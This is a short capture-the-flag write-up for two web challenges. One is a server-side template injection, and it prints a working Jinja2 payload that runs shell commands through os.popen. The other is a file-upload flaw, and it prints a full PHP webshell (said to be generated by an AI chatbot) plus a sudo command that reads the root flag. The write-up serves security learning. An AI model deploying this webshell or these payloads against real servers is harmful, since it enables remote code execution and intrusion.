WEB!

<details>
  
<summary>SSTI1</summary>


> Server side template injection
> Mainly used on python web servers which render template
> injects malicious code into the template 


![image](https://github.com/user-attachments/assets/60163473-6ed8-4442-8022-7c3a68a6dbc1)
![image](https://github.com/user-attachments/assets/30d058a5-cf52-4a91-a8e1-ba13e75ab2ee)


Announcement website, COOL

ITS TIME TO ANNOUNCE THAT IM GA...


So now we announce that 60 + 9 is 

69 

NICE

This confirms the vulnerability, Server side template injection. Which also is literlly the hint.

![image](https://github.com/user-attachments/assets/9e8b5a4c-03e4-43ac-a707-9b05dcc69611)
![image](https://github.com/user-attachments/assets/6baa1558-8716-4d86-be16-18469ac0b609)

Heres some code thats not mine, but i know it allows to run any shell commands 

```{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}```
![image](https://github.com/user-attachments/assets/1832d8e9-5f34-403c-a26c-94be10fa72c3)

and now we just cat that file and done ! 

![image](https://github.com/user-attachments/assets/17f52e53-6760-4834-818e-6e3d82d8d416)

</details>



<details>
<summary>n0s4n1ty 1</summary>

> File upload exploit
> not sanitizing user input causing RCE

![image](https://github.com/user-attachments/assets/1f9d22df-172d-4644-959f-80f14288176d)
 
nice pic bro 

![image](https://github.com/user-attachments/assets/b08a92ef-7f24-4754-b68c-369cc7af8d38)
![image](https://github.com/user-attachments/assets/ee05a9d6-74ec-4687-afeb-b935cf883dfe)

Uploaded and to no surprise, we can see the image in there =)

![image](https://github.com/user-attachments/assets/ab94b8a6-c2a3-43f2-bb8d-36ccf3499a5e)
![image](https://github.com/user-attachments/assets/c66b006a-c662-423d-831d-27ef3baa94bf)

Uploaded, acessible and rendered. 

TIME TO USE CHINA'S LATEST TECHNOLOGY: DEEPSEEK

With a simple webshell it generated, we can start executing commands on their server and navigate the files

```
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>

<form method="GET">
<input type="text" name="cmd" placeholder="Enter command">
<input type="submit" value="Execute">
</form>
```

![image](https://github.com/user-attachments/assets/dcc13ce5-d8c3-42e6-abce-0324f1d4021d)

```cd ../../../../; sudo cat /root/flag.txt```

By executing this command, we are able to read the flag file in the /root directory, of course, with sudo 

![image](https://github.com/user-attachments/assets/34e69ca6-3686-4c9d-b7bc-0f3802d7a0fe)

![image](https://github.com/user-attachments/assets/a1c909ff-b789-4949-a444-fcc9c0404b8d)


</details>
